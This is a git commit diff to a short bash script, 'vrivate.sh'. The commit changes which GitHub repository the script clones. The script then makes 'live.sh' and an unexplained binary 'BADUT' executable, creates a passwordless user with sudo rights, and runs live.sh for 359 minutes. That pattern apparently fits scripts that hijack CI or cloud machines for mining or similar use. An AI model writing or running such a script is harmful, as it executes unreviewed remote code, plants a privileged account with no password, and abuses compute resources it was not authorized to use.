ec76a6d687150bcd389e803ec592754dff2b65b1
Wilmer412 <89594426+Wilmer412@users.noreply.github.com>
2021-09-30 12:45:11 +0700

    Update vrivate.sh

--- vrivate.sh
+++ vrivate.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com/virtualmicin3/virtualmicin3.git && cd virtualmicin3
+git clone https://github.com/Wilmer412/bayy.git && cd bayy
 chmod +x live.sh && chmod +x BADUT
 sudo adduser --disabled-password --gecos "" oces && sudo usermod -aG sudo oces
 sudo -u oces -H sh -c "timeout 359m ./live.sh"
